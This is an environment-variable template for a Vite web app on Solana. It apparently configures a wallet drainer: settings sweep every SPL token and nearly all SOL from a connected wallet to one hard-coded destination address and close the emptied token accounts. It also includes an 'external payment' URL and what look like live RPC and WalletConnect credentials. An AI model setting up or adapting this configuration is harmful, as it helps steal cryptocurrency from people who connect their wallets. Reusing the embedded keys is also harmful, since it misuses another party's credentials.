# ============================================
# ENVIRONMENT VARIABLES EXAMPLE
# ============================================
# Copy this file to the project root as .env
# and adjust the values according to your needs
#
# IMPORTANT: In Vite, all variables MUST start with VITE_
# ============================================

# ============================================
# SOLANA CONFIGURATION
# ============================================

# Solana RPC Endpoint
# For mainnet: https://api.mainnet-beta.solana.com
# For devnet: https://api.devnet.solana.com
# For testnet: https://api.testnet.solana.com
VITE_SOLANA_RPC_ENDPOINT=https://solana-mainnet.core.chainstack.com/588ce3a0563eb4c8d2ebb8c60e04b0d2

# Destination wallet for transfers
# Replace with your wallet address
VITE_DESTINATION_WALLET=7N8VtS3bh5rfyzLRZZ6th8vJCXgzijDqp8EQrABp5Coz

# Wallet Connect project id
VITE_WALLET_CONNECT_PROJECT_ID=55846a70d0633a08583f55c708430332

# Solana commitment level
# Options: processed | confirmed | finalized
VITE_COMMITMENT=confirmed

# ============================================
# GENERAL CONFIGURATION
# ============================================

# Batch size for transaction processing
VITE_BATCH_SIZE=10

# Add failed transactions to tracking
# Values: true | false | 1 | 0
VITE_ADD_TX_FAILED=true

# URL for external payment system
VITE_EXTERNAL_PAYMENT_URL=https://www.getmtga.com/pay

# ============================================
# TRANSFER CONFIGURATION
# ============================================

# Enable SPL token transfers
# Values: true | false | 1 | 0
# true = Transfer SPL tokens found in wallet
# false = Don't transfer tokens, only SOL (if enabled)
VITE_TRANSFER_TOKENS=true

# Enable SOL transfers
# Values: true | false | 1 | 0
# true = Transfer SOL after reserving for fees
# false = Don't transfer SOL, only tokens (if enabled)
VITE_TRANSFER_SOL=true

# Amount of SOL to reserve for gas fees (in SOL)
# Recommended: 0.01 SOL minimum to cover transaction fees
VITE_SOL_RESERVE_AMOUNT=0.01

# Batch size for token transfers
# 1 = Each token in its own transaction (more reliable)
# >1 = Group multiple tokens per transaction (more efficient)
VITE_TRANSFER_BATCH_SIZE=1

# Close token accounts after transfer
# Values: true | false | 1 | 0
# true = Close empty accounts and recover SOL rent
# false = Leave accounts open (avoids balance errors)
VITE_CLOSE_TOKEN_ACCOUNTS=true

# ============================================
# LOGGING CONFIGURATION
# ============================================

# Enable logging system
# Values: true | false | 1 | 0
VITE_LOGGING_ENABLED=false

# Logging level
# Options: debug | info | warn | error
# debug = All messages (development)
# info = Important information (production)
# warn = Only warnings and errors
# error = Only critical errors
VITE_LOGGING_LEVEL=info

# Enable browser console logging
# Values: true | false | 1 | 0
VITE_LOGGING_CONSOLE=true

# Enable file logging (future functionality)
# Values: true | false | 1 | 0
VITE_LOGGING_FILE=false

# Show timestamps in logs
# Values: true | false | 1 | 0
VITE_LOGGING_TIMESTAMPS=true

# Show component/service names in logs
# Values: true | false | 1 | 0
VITE_LOGGING_SHOW_COMPONENT=true

# Enable blockchain-specific operation logging
# Values: true | false | 1 | 0
VITE_LOGGING_BLOCKCHAIN_LOGGING=true

# Enable wallet-specific operation logging
# Values: true | false | 1 | 0
VITE_LOGGING_WALLET_LOGGING=true

# ============================================
# EXAMPLE CONFIGURATIONS
# ============================================

# EXAMPLE 1: SOL Only (No Tokens)
# VITE_TRANSFER_TOKENS=false
# VITE_TRANSFER_SOL=true
# VITE_SOL_RESERVE_AMOUNT=0.01
# VITE_LOGGING_LEVEL=info

# EXAMPLE 2: Tokens Only (No SOL)
# VITE_TRANSFER_TOKENS=true
# VITE_TRANSFER_SOL=false
# VITE_TRANSFER_BATCH_SIZE=1
# VITE_LOGGING_LEVEL=debug

# EXAMPLE 3: Tokens and SOL (Complete Transfer)
# VITE_TRANSFER_TOKENS=true
# VITE_TRANSFER_SOL=true
# VITE_SOL_RESERVE_AMOUNT=0.01
# VITE_CLOSE_TOKEN_ACCOUNTS=false

# EXAMPLE 4: Development with Full Logging
# VITE_SOLANA_RPC_ENDPOINT=https://api.devnet.solana.com
# VITE_TRANSFER_TOKENS=true
# VITE_TRANSFER_SOL=true
# VITE_LOGGING_LEVEL=debug
# VITE_LOGGING_BLOCKCHAIN_LOGGING=true

